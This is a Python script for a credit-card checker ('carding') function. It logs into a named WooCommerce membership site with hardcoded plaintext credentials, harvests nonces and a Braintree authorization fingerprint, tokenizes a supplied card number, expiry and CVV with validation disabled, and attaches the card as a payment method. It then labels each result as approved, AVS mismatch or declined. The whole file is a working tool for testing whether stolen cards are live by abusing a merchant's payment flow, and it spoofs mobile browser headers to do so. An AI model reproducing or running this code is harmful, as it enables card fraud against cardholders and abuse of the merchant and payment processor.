import requests
import re
import base64
import json

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

def ali1(card: str):
    """
    Full ali1 implementation (no proxy), returns (success: bool, message: str, proxy_info: str)
    """
    proxy_used_str = "No Proxy Used"
    try:
        # ---------- parse card ----------
        parts = re.split(r'[|:/]', card.strip())
        if len(parts) < 4:
            return False, "Invalid card format ❌", proxy_used_str
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]

        # normalize year/month
        if len(yy) == 2:
            yy_full = f"20{yy}"
        elif len(yy) == 4:
            yy_full = yy
        else:
            return False, "Invalid Year Format", proxy_used_str
        if len(mm) == 1:
            mm = f"0{mm}"

        session = requests.Session()

        USERNAME = 'faolmj@telegmail.com'
        PASSWORD = 'karar1111/3/'
        SESSION_ID_V1 = 'c90eda01-3831-456c-98c7-d170b8035586'

        # ================= Step 1: GET login page (get nonce) =================
        HEADERS_GET_LOGIN_NONCE = {
            'authority': 'my.restrictcontentpro.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://my.restrictcontentpro.com/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '""',
            'sec-ch-ua-full-version': '"137.0.7337.0"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO CK7n"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': UA,
        }
        resp = session.get('https://my.restrictcontentpro.com/my-account/', headers=HEADERS_GET_LOGIN_NONCE, timeout=20)
        login_nonce_m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', resp.text)
        if not login_nonce_m:
            return False, "Failed to fetch login nonce", proxy_used_str
        login_nonce = login_nonce_m.group(1)

        # ================= Step 2: POST login =================
        HEADERS_LOGIN = {
            'authority': 'my.restrictcontentpro.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://my.restrictcontentpro.com',
            'referer': 'https://my.restrictcontentpro.com/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '""',
            'sec-ch-ua-full-version': '"137.0.7337.0"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO CK7n"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': UA,
        }
        DATA_LOGIN = {
            'username': USERNAME,
            'password': PASSWORD,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        session.post('https://my.restrictcontentpro.com/my-account/', cookies=session.cookies, headers=HEADERS_LOGIN, data=DATA_LOGIN, timeout=20)

        # ================= Step 3: GET add-payment-method page (get add_nonce + client_token_nonce) =================
        HEADERS_GET_PAY_NONCE = {
            'authority': 'my.restrictcontentpro.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://my.restrictcontentpro.com/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '""',
            'sec-ch-ua-full-version': '"137.0.7337.0"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO CK7n"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': UA,
        }
        resp2 = session.get('https://my.restrictcontentpro.com/my-account/add-payment-method/', cookies=session.cookies, headers=HEADERS_GET_PAY_NONCE, timeout=20)
        add_nonce_m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp2.text)
        client_token_nonce_m = re.search(r'client_token_nonce":"([^"]+)"', resp2.text)
        if not add_nonce_m or not client_token_nonce_m:
            return False, "Failed to fetch add-payment nonces", proxy_used_str
        add_nonce = add_nonce_m.group(1)
        client_token_nonce = client_token_nonce_m.group(1)

        # ================= Step 4: POST AJAX to get client token (base64) =================
        HEADERS_AJAX = {
            'authority': 'my.restrictcontentpro.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://my.restrictcontentpro.com',
            'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '""',
            'sec-ch-ua-full-version': '"137.0.7337.0"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO CK7n"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UA,
            'x-requested-with': 'XMLHttpRequest',
        }
        DATA_TOKEN = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }
        resp_token = session.post('https://my.restrictcontentpro.com/wp/wp-admin/admin-ajax.php', cookies=session.cookies, headers=HEADERS_AJAX, data=DATA_TOKEN, timeout=20)

        try:
            enc = resp_token.json().get('data')
            dec = base64.b64decode(enc).decode('utf-8')
            auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
        except Exception:
            return False, "Failed to get Braintree Auth Fingerprint", proxy_used_str

        # ================= Step 5: Tokenize card via Braintree GraphQL =================
        HEADERS_GRAPHQL = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': UA,
        }
        JSON_DATA_TOKENIZE = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': SESSION_ID_V1,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy_full,
                        'cvv': cvc,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        resp_tokenize = session.post('https://payments.braintree-api.com/graphql', headers=HEADERS_GRAPHQL, json=JSON_DATA_TOKENIZE, timeout=20)

        try:
            payment_token = resp_tokenize.json()['data']['tokenizeCreditCard']['token']
        except Exception:
            return False, "Failed to tokenize credit card", proxy_used_str

        # ================= Step 6: Final - Add payment method using token =================
        HEADERS_FINAL = {
            'authority': 'my.restrictcontentpro.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://my.restrictcontentpro.com',
            'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '""',
            'sec-ch-ua-full-version': '"137.0.7337.0"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO CK7n"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': UA,
        }

        DATA_FINAL = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'master-card'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', payment_token),
            ('wc_braintree_device_data', '{"correlation_id":"222412efc0b61b3999d1c0cc5f374f71"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_device_data', '{"correlation_id":"222412efc0b61b3999d1c0cc5f374f71"}'),
            ('wc-braintree-paypal-context', 'shortcode'),
            ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'USD'),
            ('wc_braintree_paypal_locale', 'en_us'),
            ('wc_braintree-paypal-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', add_nonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        resp_final = session.post('https://my.restrictcontentpro.com/my-account/add-payment-method/', cookies=session.cookies, headers=HEADERS_FINAL, data=DATA_FINAL, timeout=20)
        text = resp_final.text

        # ================= Step 7: Interpret final response =================
        if 'Payment method successfully added.' in text or 'Nice! New payment method added' in text:
            return True, '1000 | APPROVED (Method Added) ✅', proxy_used_str

        if 'risk_threshold' in text:
            return False, 'risk_threshold ❌', proxy_used_str
        if 'Please wait for 20 seconds.' in text:
            return False, 'try again (20 seconds) ❌', proxy_used_str

        # try to parse status pattern if present
        pattern = r'Status code \s*(.+?)<\/'
        match = re.search(pattern, text)
        if match:
            result = match.group(1).strip()
            if ('avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Approved' in result or 'successfully' in result or 'changed' in result):
                return True, result, proxy_used_str
            elif 'Invalid postal code' in result or 'INVALID_BILLING_ADDRESS' in result:
                return True, f"CCN/AVS Mismatch: {result}", proxy_used_str
            else:
                return False, result, proxy_used_str

        # fallback
        return False, 'DECLINED or Unknown Error ❌', proxy_used_str

    except Exception as e:
        return False, f"Error: {e}", proxy_used_str
